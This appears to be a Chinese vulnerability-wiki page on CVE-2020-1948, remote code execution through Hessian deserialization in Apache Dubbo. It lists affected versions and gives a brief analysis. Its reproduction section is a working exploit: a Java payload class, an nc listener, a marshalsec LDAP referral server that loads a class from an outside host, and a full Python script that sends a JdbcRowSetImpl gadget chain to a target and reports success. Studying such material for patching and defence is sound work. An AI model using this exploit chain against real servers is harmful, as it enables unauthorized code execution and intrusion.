<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Apache%20Dubbo/%EF%BC%88CVE-2020-1948%EF%BC%89Apache%20Dubbo%20Hessian%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>（CVE-2020-1948）Apache Dubbo Hessian 反序列化漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "\uff08CVE-2020-1948\uff09Apache Dubbo Hessian \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e", url: "#_top", children: [
              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_6" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../Apache%20Flink/Apache%20Flink%20Dashboard%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../Apache%20Flink/Apache%20Flink%20Dashboard%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="btn btn-xs btn-link">
        Apache Flink Dashboard 未授权访问-远程代码命令执行
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../%EF%BC%88CVE-2019-17564%EF%BC%89Apache%20Dubbo%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../%EF%BC%88CVE-2019-17564%EF%BC%89Apache%20Dubbo%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2019-17564）Apache Dubbo 反序列化漏洞
      </a>
    </div>
    
  </div>

    

    <h1 id="cve-2020-1948apache-dubbo-hessian">（CVE-2020-1948）Apache Dubbo Hessian 反序列化漏洞<a class="headerlink" href="#cve-2020-1948apache-dubbo-hessian" title="Permanent link">&para;</a></h1>
<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>攻击者可以发送带有无法识别的服务名或方法名及某些恶意参数负载的RPC请求，当恶意参数被反序列化时将导致代码执行</p>
<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<p>2.7.0 \&lt;= Apache Dubbo \&lt;= 2.7.7</p>
<p>2.6.0 \&lt;= Apache Dubbo \&lt;= 2.6.7</p>
<p>Apache Dubbo 全部 2.5.x 版本</p>
<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<h3 id="_4">漏洞分析<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
<p>Hessian是一个轻量级的RPC框架。它基于HTTP协议传输，使用Hessian二进制序列化，对于数据包比较大的情况比较友好。使用hession的web项目需要配置web.xml,映射<code>com.caucho.hessian.server.HessianServlet</code>之相应的路径</p>
<p><img alt="1.png" src="../resource/%28CVE-2020-1948%29ApacheDubboHessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId25.png" /></p>
<p>Java客户端可以很方便的调用服务器上的方法,如下</p>
<p><img alt="2.png" src="../resource/%28CVE-2020-1948%29ApacheDubboHessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId26.png" /></p>
<p>查看<code>com.caucho.hessian.server.HessianServlet</code>的代码service方法处理客户端发来的http请求,调用</p>
<p><img alt="3.png" src="../resource/%28CVE-2020-1948%29ApacheDubboHessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId27.png" /></p>
<p><img alt="4.png" src="../resource/%28CVE-2020-1948%29ApacheDubboHessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId28.png" /></p>
<p>调用HessianSkeleton的invoke方法,将从客户端发来的数据流中读取对象</p>
<p><img alt="5.png" src="../resource/%28CVE-2020-1948%29ApacheDubboHessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId29.png" /></p>
<p>看代码里面好像没有什么黑白名单过滤机制通过抓取请求包,分析,构造请求包,将marshalsec工具生成的Resion
payload发送给服务器下面是构造请求包的<code>CVE-2020-1948.py</code>代码</p>
<p><img alt="6.png" src="../resource/%28CVE-2020-1948%29ApacheDubboHessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId30.png" /></p>
<p>利用图</p>
<p><img alt="7.png" src="../resource/%28CVE-2020-1948%29ApacheDubboHessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId31.png" /></p>
<p><img alt="8.png" src="../resource/%28CVE-2020-1948%29ApacheDubboHessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId32.png" /></p>
<h3 id="_5">漏洞复现<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
<h4 id="poc">构造poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code><span class="c1">## exp.java</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">javax.naming.Context</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">javax.naming.Name</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">javax.naming.spi.ObjectFactory</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Hashtable</span><span class="p">;</span>

<span class="n">public</span> <span class="k">class</span><span class="w"> </span><span class="nc">exp</span> <span class="p">{</span>
    <span class="n">public</span> <span class="n">exp</span><span class="p">(){</span>
        <span class="k">try</span> <span class="p">{</span>
            <span class="n">java</span><span class="o">.</span><span class="n">lang</span><span class="o">.</span><span class="n">Runtime</span><span class="o">.</span><span class="n">getRuntime</span><span class="p">()</span><span class="o">.</span><span class="n">exec</span><span class="p">(</span><span class="s2">&quot;calc.exe&quot;</span><span class="p">);</span>
        <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">java</span><span class="o">.</span><span class="n">io</span><span class="o">.</span><span class="n">IOException</span> <span class="n">e</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">e</span><span class="o">.</span><span class="n">printStackTrace</span><span class="p">();</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div>

<blockquote>
<p>编译poc</p>
</blockquote>
<div class="codehilite"><pre><span></span><code>javac exp.java
</code></pre></div>

<h4 id="nc">nc监听<a class="headerlink" href="#nc" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code>nc -lvvp 12345
</code></pre></div>

<h4 id="webexpclassweb">服务器开启web服务，并将生成好的exp.class放置web目录<a class="headerlink" href="#webexpclassweb" title="Permanent link">&para;</a></h4>
<h4 id="ldap">启动 LDAP 代理服务<a class="headerlink" href="#ldap" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://www.0-sec.org/#exp 81
</code></pre></div>

<blockquote>
<p>marshalsec 下载：</p>
</blockquote>
<div class="codehilite"><pre><span></span><code><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">download</span><span class="o">.</span><span class="mi">0</span><span class="o">-</span><span class="n">sec</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">Web安全</span><span class="o">/</span><span class="n">java反序列化漏洞</span><span class="o">/</span><span class="n">marshalsec</span><span class="o">-</span><span class="mf">0.0</span><span class="o">.</span><span class="mi">3</span><span class="o">-</span><span class="n">SNAPSHOT</span><span class="o">-</span><span class="n">all</span><span class="o">.</span><span class="n">jar</span>
</code></pre></div>

<h4 id="py">py脚本测试<a class="headerlink" href="#py" title="Permanent link">&para;</a></h4>
<blockquote>
<p>安装依赖包</p>
</blockquote>
<div class="codehilite"><pre><span></span><code>pip install dubbo-py
</code></pre></div>

<blockquote>
<p>运行</p>
</blockquote>
<div class="codehilite"><pre><span></span><code>python poc.py www.target.com 12345 ldap://www.yourweb:81/exp
</code></pre></div>

<blockquote>
<p>除了通过返回信息来判断外，观察 LDAP
代理是否出现请求转发也是判断POC利用是否成功的重要依据:</p>
</blockquote>
<div class="codehilite"><pre><span></span><code><span class="c1"># LDAP Refer Server Output</span>
<span class="n">Send</span> <span class="n">LDAP</span> <span class="n">reference</span> <span class="n">result</span> <span class="k">for</span> <span class="n">exp</span> <span class="n">redirecting</span> <span class="n">to</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="mf">.0</span><span class="o">-</span><span class="n">sec</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">exp</span><span class="o">.</span><span class="k">class</span>
<span class="err"># </span><span class="nc">poc</span><span class="o">.</span><span class="n">py</span>
<span class="c1"># -*- coding: utf-8 -*-</span>

<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>

<span class="kn">from</span><span class="w"> </span><span class="nn">dubbo.codec.hessian2</span><span class="w"> </span><span class="kn">import</span> <span class="n">Decoder</span><span class="p">,</span><span class="n">new_object</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">dubbo.client</span><span class="w"> </span><span class="kn">import</span> <span class="n">DubboClient</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">:</span>
  <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Usage: python </span><span class="si">{}</span><span class="s1"> DUBBO_HOST DUBBO_PORT LDAP_URL&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
  <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">Example:</span><span class="se">\n\n</span><span class="s1">- python </span><span class="si">{}</span><span class="s1"> 1.1.1.1 12345 ldap://1.1.1.6:80/exp&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
  <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>

<span class="n">client</span> <span class="o">=</span> <span class="n">DubboClient</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]))</span>

<span class="n">JdbcRowSetImpl</span><span class="o">=</span><span class="n">new_object</span><span class="p">(</span>
  <span class="s1">&#39;com.sun.rowset.JdbcRowSetImpl&#39;</span><span class="p">,</span>
  <span class="n">dataSource</span><span class="o">=</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span>
  <span class="n">strMatchColumns</span><span class="o">=</span><span class="p">[</span><span class="s2">&quot;foo&quot;</span><span class="p">]</span>
  <span class="p">)</span>
<span class="n">JdbcRowSetImplClass</span><span class="o">=</span><span class="n">new_object</span><span class="p">(</span>
  <span class="s1">&#39;java.lang.Class&#39;</span><span class="p">,</span>
  <span class="n">name</span><span class="o">=</span><span class="s2">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="p">,</span>
  <span class="p">)</span>
<span class="n">toStringBean</span><span class="o">=</span><span class="n">new_object</span><span class="p">(</span>
  <span class="s1">&#39;com.rometools.rome.feed.impl.ToStringBean&#39;</span><span class="p">,</span>
  <span class="n">beanClass</span><span class="o">=</span><span class="n">JdbcRowSetImplClass</span><span class="p">,</span>
  <span class="n">obj</span><span class="o">=</span><span class="n">JdbcRowSetImpl</span>
  <span class="p">)</span>

<span class="n">resp</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">send_request_and_return_response</span><span class="p">(</span>
  <span class="n">service_name</span><span class="o">=</span><span class="s1">&#39;org.apache.dubbo.spring.boot.sample.consumer.DemoService&#39;</span><span class="p">,</span>
  <span class="c1"># 此处可以是 $invoke、$invokeSync、$echo 等，通杀 2.7.7 及 CVE 公布的所有版本。</span>
  <span class="n">method_name</span><span class="o">=</span><span class="s1">&#39;$invoke&#39;</span><span class="p">,</span>
  <span class="n">args</span><span class="o">=</span><span class="p">[</span><span class="n">toStringBean</span><span class="p">])</span>

<span class="n">output</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">resp</span><span class="p">)</span>
<span class="k">if</span> <span class="s1">&#39;Fail to decode request due to: RpcInvocation&#39;</span> <span class="ow">in</span> <span class="n">output</span><span class="p">:</span>
  <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[!] Target maybe not support deserialization.&#39;</span><span class="p">)</span>
<span class="k">elif</span> <span class="s1">&#39;EXCEPTION: Could not complete class com.sun.rowset.JdbcRowSetImpl.toString()&#39;</span> <span class="ow">in</span> <span class="n">output</span><span class="p">:</span>
   <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[+] Succeed.&#39;</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
  <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[!] Output:&#39;</span><span class="p">)</span>
  <span class="nb">print</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
  <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[!] Target maybe not use dubbo-remoting library.&#39;</span><span class="p">)</span>
</code></pre></div>

<h2 id="_6">参考链接<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
<blockquote>
<p><a href="https://github.com/DSO-Lab/Dubbo-CVE-2020-1948/wiki">https://github.com/DSO-Lab/Dubbo-CVE-2020-1948/wiki</a></p>
</blockquote>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../Apache%20Flink/Apache%20Flink%20Dashboard%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../Apache%20Flink/Apache%20Flink%20Dashboard%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="btn btn-xs btn-link">
        Apache Flink Dashboard 未授权访问-远程代码命令执行
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../%EF%BC%88CVE-2019-17564%EF%BC%89Apache%20Dubbo%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../%EF%BC%88CVE-2019-17564%EF%BC%89Apache%20Dubbo%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2019-17564）Apache Dubbo 反序列化漏洞
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>